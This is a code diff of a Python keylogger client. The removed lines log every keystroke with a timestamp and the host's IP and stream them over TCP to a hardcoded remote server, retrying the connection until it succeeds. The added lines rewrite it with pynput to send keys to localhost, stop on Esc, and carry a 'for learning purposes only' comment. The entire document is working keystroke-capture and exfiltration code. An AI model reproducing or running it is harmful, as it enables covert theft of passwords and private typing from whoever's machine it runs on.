@@ -1,39 +1,29 @@
-import keyboard
+# client.py
+# Captures keyboard input and sends it to server (for learning purposes only)
+
+from pynput import keyboard
 import socket
-import time
-import datetime
 
-# Set up the client
-server_ip = "192.168.169.11"  # Replace with your server's IP
-port = 9999
-client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+SERVER_IP = "127.0.0.1"   # Use localhost for demo
+PORT = 9999
 
-# Connect to the server
-while True:
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect((SERVER_IP, PORT))
+
+def on_press(key):
     try:
-        client_socket.connect((server_ip, port))
-        print(f"Connected to server at {server_ip}:{port}")
-        # Get the local IP address of this machine
-        local_ip = client_socket.getsockname()[0]
-        break
-    except Exception as e:
-        print(f"Connection failed: {e}. Retrying in 5 seconds...")
-        time.sleep(5)
+        data = key.char
+    except AttributeError:
+        data = f"[{key}]"
 
-# Function to send keystrokes with timestamps and IP address
-def on_key_press(event):
-    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    key_name = event.name
-    # Include the local IP in the message
-    message = f"[{timestamp}] [{local_ip}] {key_name}\n"
     try:
-        client_socket.send(message.encode())
-    except Exception as e:
-        print(f"Error sending key: {e}")
+        client.send(data.encode())
+    except:
+        pass
 
-# Start logging keystrokes
-keyboard.on_press(on_key_press)
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
 
-# Keep the script running
-while True:
-    time.sleep(1)
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
